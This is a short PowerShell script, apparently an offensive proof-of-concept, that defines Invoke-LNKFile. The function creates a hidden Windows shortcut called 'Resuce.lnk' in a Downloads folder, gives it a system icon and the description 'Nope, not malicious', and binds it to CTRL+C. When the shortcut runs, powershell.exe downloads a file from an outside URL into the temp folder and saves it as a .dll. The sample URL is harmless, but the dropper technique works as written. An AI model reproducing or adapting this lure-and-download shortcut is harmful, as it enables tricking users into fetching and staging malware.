<#
.SYNOPSIS
    Creates and configures a hidden LNK (shortcut) file to execute a specified command.

.DESCRIPTION
    The Invoke-LNKFile function creates a shortcut file (.lnk) at a specified path.
    It sets various properties of the shortcut, such as the icon, target path, arguments, working directory, hotkey, and window style.
    The shortcut is then saved and hidden.

.PARAMETER None
    This function does not require any parameters.

.EXAMPLE
    Invoke-LNKFile

.NOTES
    Author: Lenard
    Date: 2024-10-27 (Added to GitHub)
#>

﻿function Invoke-LNKFile {
    $path = "C:\Users\SomeUser\Downloads\Resuce.lnk"
    $wshell = New-Object -ComObject Wscript.Shell
    $sc = $wshell.CreateShortcut($path)
    $sc.IconLocation = "C:\Windows\System32\shell32.dll,70"
    $sc.TargetPath = "powershell.exe"
    $sc.Arguments = "IWR -Uri https://google.com -OutFile $env:TEMP\google.dll"
    $sc.WorkingDirectory = "C:"
    $sc.HotKey = 'CTRL+C'
    $sc.Description = "Nope, not malicious"
    #7 = Minimized window, 3 = Maximized window, 1 = Normal    window
    $sc.WindowStyle = 1
    $sc.Save()
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($sc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wshell) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
    (Get-Item $path).Attributes += 'Hidden'
}
